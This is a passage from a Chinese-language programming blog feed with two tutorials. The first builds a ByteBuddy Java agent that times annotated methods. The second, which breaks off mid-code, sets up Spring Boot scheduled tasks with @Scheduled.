class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">encoding</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">encoding</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>org.xxz.AgentMain<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assembly<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里我们使用了bytebuddy，不懂得看官可以上官方网站瞧瞧<a href="http://bytebuddy.net/" target="_blank" rel="noopener">http://bytebuddy.net/</a></p>
<p>再来看看我们得AgentMain.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.agent.builder.AgentBuilder;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.method.MethodDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.description.type.TypeDescription;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.dynamic.DynamicType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.MethodDelegation;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.matcher.ElementMatchers;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.utility.JavaModule;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">premain</span><span class="params">(String args, Instrumentation inst)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Transformer transformer = <span class="keyword">new</span> AgentBuilder.Transformer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> DynamicType.Builder&lt;?&gt; transform(DynamicType.Builder&lt;?&gt; builder,</span><br><span class="line">                                                    TypeDescription typeDescription,</span><br><span class="line">                                                    ClassLoader classLoader,</span><br><span class="line">                                                    JavaModule javaModule) &#123;</span><br><span class="line">                <span class="keyword">return</span> builder</span><br><span class="line">                        .method(ElementMatchers.any()) <span class="comment">// 拦截任意方法</span></span><br><span class="line">                        .intercept(MethodDelegation.to(TimeInterceptor.class)); <span class="comment">// 委托</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        AgentBuilder.Listener listener = <span class="keyword">new</span> AgentBuilder.Listener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDiscovery</span><span class="params">(String s, ClassLoader classLoader, JavaModule javaModule, <span class="keyword">boolean</span> b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTransformation</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule javaModule, <span class="keyword">boolean</span> b, DynamicType dynamicType)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onIgnored</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule javaModule, <span class="keyword">boolean</span> b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(String s, ClassLoader classLoader, JavaModule javaModule, <span class="keyword">boolean</span> b, Throwable throwable)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onComplete</span><span class="params">(String s, ClassLoader classLoader, JavaModule javaModule, <span class="keyword">boolean</span> b)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> AgentBuilder</span><br><span class="line">                .Default()</span><br><span class="line">                .type(ElementMatchers.nameStartsWith(<span class="string">"org.xxz"</span>))<span class="comment">// 指定需要拦截的类</span></span><br><span class="line">                .transform(transformer)</span><br><span class="line">                .with(listener)</span><br><span class="line">                .installOn(inst);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们看看我们得TimeInterceptor.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.Origin;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.RuntimeType;</span><br><span class="line"><span class="keyword">import</span> net.bytebuddy.implementation.bind.annotation.SuperCall;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TimeInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RuntimeType</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">interceptor</span><span class="params">(@Origin Class clazz,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   @Origin Method method,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   @SuperCall Callable&lt;?&gt; callable)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        TraceTime traceTime = method.getAnnotation(TraceTime.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (traceTime == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> callable.call();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 原有函数执行</span></span><br><span class="line">            <span class="keyword">return</span> callable.call();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(clazz.getSimpleName() + <span class="string">"#"</span> + method.getName() + <span class="string">" cost "</span> + (System.currentTimeMillis() - start) + <span class="string">"ms"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后就是我们得注解了TraceTime.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> TraceTime &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到这里我们得java-agent就开发完成了。。。。。是不是很简单啊。。。。</p>
<p>接下来，我们看看使用方式咯。。。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java-agent-test</span><br><span class="line">--src</span><br><span class="line">	--main</span><br><span class="line">		--java</span><br><span class="line">			--org.xxz</span><br><span class="line">				--test</span><br><span class="line">					--AgentMainTest.java</span><br><span class="line">					--Demo.java</span><br><span class="line">				--TraceTime.java</span><br><span class="line">		--resource</span><br><span class="line">	--test</span><br><span class="line">--pom.xml</span><br></pre></td></tr></table></figure>
<p>依旧先看我们得pom文件</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span><br><span class="line">         xmlns:xsi=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.xxz&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;java-agent-test&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;build&gt;</span><br><span class="line">        &lt;plugins&gt;</span><br><span class="line">            &lt;plugin&gt;</span><br><span class="line">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">                &lt;configuration&gt;</span><br><span class="line">                    &lt;source&gt;1.8&lt;/source&gt;</span><br><span class="line">                    &lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line">                    &lt;encoding&gt;utf-8&lt;/encoding&gt;</span><br><span class="line">                &lt;/configuration&gt;</span><br><span class="line">            &lt;/plugin&gt;</span><br><span class="line">        &lt;/plugins&gt;</span><br><span class="line">    &lt;/build&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<p>这里的pom文件上面的简单多了。</p>
<p>看看我们的测试类AgentMainTest.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.test;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentMainTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Demo demo = <span class="keyword">new</span> Demo();</span><br><span class="line">        demo.print(<span class="string">"agent"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看看我们的Demo.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.xxz.TraceTime;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TraceTime</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String string)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">100L</span>);</span><br><span class="line">        System.out.println(<span class="string">"hello "</span> + string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还少了一个TraceTime.java，把上面的拷贝过来哦。。。。注意包的结构要一样哦。。。。。</p>
<p>上面介绍了如何命令行使用java-agent.jar，这里我们介绍如何再IDE中使用，要上图了哦。。。。。</p>
<p><img src="http://wx2.sinaimg.cn/large/afc434bdly1fplwyw9k23j20tz0k2dh2.jpg" alt="image"></p>
<p>好了，今天的文章到这里就结束了。。。</p>
<p>最后还来一张运行结果吧。。。。</p>
<p><img src="http://ws3.sinaimg.cn/large/afc434bdly1fplx00z1cxj20ir03c3yi.jpg" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[spring定时任务调度]]></title>
      <url>/2018/spring-scheduling-tasks/</url>
      <content type="html"><![CDATA[<p>本文将告诉你如何使用spring的任务调度。主要使用@Scheduled注解<br><a id="more"></a></p>
<blockquote>
<p>需要会使用maven</p>
</blockquote>
<h2 id="第一步-pom-xml配置"><a href="#第一步-pom-xml配置" class="headerlink" title="第一步 pom.xml配置"></a>第一步 pom.xml配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xxz<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>scheduled-task-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="第二步-定时任务类-ScheduledTasks"><a href="#第二步-定时任务类-ScheduledTasks" class="headerlink" title="第二步 定时任务类(ScheduledTasks)"></a>第二步 定时任务类(ScheduledTasks)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.task;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.Scheduled;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScheduledTasks</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Scheduled</span>(fixedRate = <span class="number">5000</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">now</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log.info(<span class="string">"The time is now &#123;&#125;"</span>, <span class="keyword">new</span> Date());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>@Scheduled有三种类型参数fixedRate, fixedDelay, cron</p>
<p>fixedRate 表示每隔多少毫秒执行一次</p>
<p>fixedDelay 表示任务执行完成后隔多少毫秒执行一次</p>
<p>cron 定时任务表达式</p>
<h2 id="第三步-启动类-Application"><a href="#第三步-启动类-Application" class="headerlink" title="第三步 启动类(Application)"></a>第三步 启动类(Application)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.EnableScheduling;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span 